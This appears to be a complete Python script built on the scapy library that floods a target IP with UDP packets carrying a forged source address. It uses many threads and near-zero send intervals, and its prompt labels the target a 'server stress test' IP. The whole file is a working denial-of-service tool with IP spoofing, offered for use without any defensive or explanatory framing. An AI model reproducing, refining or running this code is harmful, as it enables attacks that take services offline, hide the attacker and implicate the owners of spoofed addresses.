import threading
import os
from scapy.all import *

def send_packets(target_ip, spoofed_ip, target_port, spoofed_port, payload, packet_count):
    try:
        packets = [IP(src=spoofed_ip, dst=target_ip) / UDP(sport=spoofed_port, dport=target_port) / Raw(load=payload) for _ in range(packet_count)]
        send(packets, inter=0.000001, loop=1, verbose=False) 
    except Exception as e:
        print("Error sending packets:", e)

def flood_worker(target_ip, spoofed_ip, target_port, spoofed_port, payload, packet_count):
    try:
        send_packets(target_ip, spoofed_ip, target_port, spoofed_port, payload, packet_count)
    except Exception as e:
        print("Error in flood worker:", e)

def main():
    target_ip = input("What is the server stress test IP? ")
    spoofed_ip = input("What is the spoofed IP address? ")
    target_port = 80
    spoofed_port = 420
    payload = "A" * 1400 
    packet_count = 1000   

    # CPU 
    num_threads = os.cpu_count() * 10

    threads = [threading.Thread(target=flood_worker, args=(target_ip, spoofed_ip, target_port, spoofed_port, payload, packet_count)) for _ in range(num_threads)]
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
